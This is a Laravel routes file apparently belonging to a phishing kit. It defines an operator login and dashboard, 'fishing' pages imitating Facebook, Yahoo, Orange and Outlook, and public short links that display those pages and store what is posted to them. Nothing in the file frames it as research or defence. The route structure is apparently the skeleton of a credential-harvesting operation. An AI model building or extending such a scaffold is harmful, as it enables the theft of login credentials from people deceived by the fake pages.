<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', ['App\Http\Controllers\LoginController', 'index'])->name('login.index');
Route::post('/', ['App\Http\Controllers\LoginController', 'authenticate'])->name('auth.login');
Route::post('/logout', ['App\Http\Controllers\LoginController', 'logout'])->middleware('auth')->name('auth.logout');

Route::get('/dashboard', ['App\Http\Controllers\DashboardController', 'index'])->middleware('auth')->name('dashboard');
Route::get('/users', ['App\Http\Controllers\DashboardController', 'users'])->middleware('auth')->name('users.index');
Route::get('/shortlink', ['App\Http\Controllers\DashboardController', 'shortlink'])->middleware('auth')->name('shortlink.index');

Route::prefix('/fishing')->controller('App\Http\Controllers\FishingController')->group(function () {
    Route::get('facebook', 'facebook_index')->name('facebook.index');
    Route::get('yahoo', 'yahoo_index')->name('yahoo.index');
    Route::get('orange', 'orange_index')->name('orange.index');
    Route::get('outlook', 'outlook_index')->name('outlook.index');
});

Route::get('s/{shortkey}', ['App\Http\Controllers\FishingController', 'index'])->name('shortlink');
Route::post('s/{shortkey}', ['App\Http\Controllers\FishingController', 'store'])->name('shortlink.store');
